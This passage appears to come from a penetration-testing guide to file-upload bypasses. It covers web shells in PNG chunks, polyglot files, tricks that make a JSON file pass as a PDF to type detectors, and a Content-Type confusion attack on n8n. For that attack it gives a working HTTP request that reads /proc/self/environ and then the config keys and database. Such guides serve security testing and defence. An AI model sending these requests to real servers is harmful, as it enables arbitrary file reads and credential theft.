  \ by these operations is a significant advantage for certain use cases.\n\nA detailed exploration of this technique, including\
  \ its methodology and potential applications, is provided in the following article: [\"Encoding Web Shells in PNG IDAT chunks\"\
  ](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). This resource offers a comprehensive\
  \ understanding of the process and its implications.\n\nMore information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)\n\
  \n## Polyglot Files\n\nPolyglot files serve as a unique tool in cybersecurity, acting as chameleons that can validly exist\
  \ in multiple file formats simultaneously. An intriguing example is a [GIFAR](https://en.wikipedia.org/wiki/Gifar), a hybrid\
  \ that functions both as a GIF and a RAR archive. Such files aren't limited to this pairing; combinations like GIF and JS\
  \ or PPT and JS are also feasible.\n\nThe core utility of polyglot files lies in their capacity to circumvent security measures\
  \ that screen files based on type. Common practice in various applications entails permitting only certain file types for\
  \ upload—like JPEG, GIF, or DOC—to mitigate the risk posed by potentially harmful formats (e.g., JS, PHP, or Phar files).\
  \ However, a polyglot, by conforming to the structural criteria of multiple file types, can stealthily bypass these restrictions.\n\
  \nDespite their adaptability, polyglots do encounter limitations. For instance, while a polyglot might simultaneously embody\
  \ a PHAR file (PHp ARchive) and a JPEG, the success of its upload might hinge on the platform's file extension policies.\
  \ If the system is stringent about allowable extensions, the mere structural duality of a polyglot may not suffice to guarantee\
  \ its upload.\n\nMore information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)\n\
  \n### Upload valid JSONs like if it was PDF\n\nHow to avoid file type detections by uploading a valid JSON file even if\
  \ not allowed by faking a PDF file (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):\n\
  \n- **`mmmagic` library**: As long as the `%PDF` magic bytes are in the first 1024 bytes it’s valid (get example from post)\n\
  - **`pdflib` library**: Add a fake PDF format inside a filed of the JSON so the library thinks it’s a pdf (get example from\
  \ post)\n- **`file` binary**: It can read up to 1048576 bytes from a file. Just create a JSON bigger than that so it cannot\
  \ parse the content as a json and then inside the JSON put the initial part of a real PDF and it’ll think it’s a PDF\n\n\
  ### Content-Type confusion to arbitrary file read\n\nSome upload handlers **trust the parsed request body** (e.g., `context.getBodyData().files`)\
  \ and later **copy the file from `file.filepath`** without first enforcing `Content-Type: multipart/form-data`. If the server\
  \ accepts `application/json`, you can supply a fake `files` object pointing `filepath` to **any local path**, turning the\
  \ upload flow into an arbitrary file read primitive.\n\nExample POST against a form workflow returning the uploaded binary\
  \ in the HTTP response:\n\n```http\nPOST /form/vulnerable-form HTTP/1.1\nHost: target\nContent-Type: application/json\n\n\
  {\n  \"files\": {\n    \"document\": {\n      \"filepath\": \"/proc/self/environ\",\n      \"mimetype\": \"image/png\",\n\
  \      \"originalFilename\": \"x.png\"\n    }\n  }\n}\n```\n\nBackend copies `file.filepath`, so the response returns that\
  \ path’s content. Common chain: read `/proc/self/environ` to learn `$HOME`, then `$HOME/.n8n/config` for keys and `$HOME/.n8n/database.sqlite`\
  \ for user identifiers.\n\n## References\n\n- [n8n form upload Content-Type confusion → arbitrary file read PoC](https://github.com/Chocapikk/CVE-2026-21858)\n\
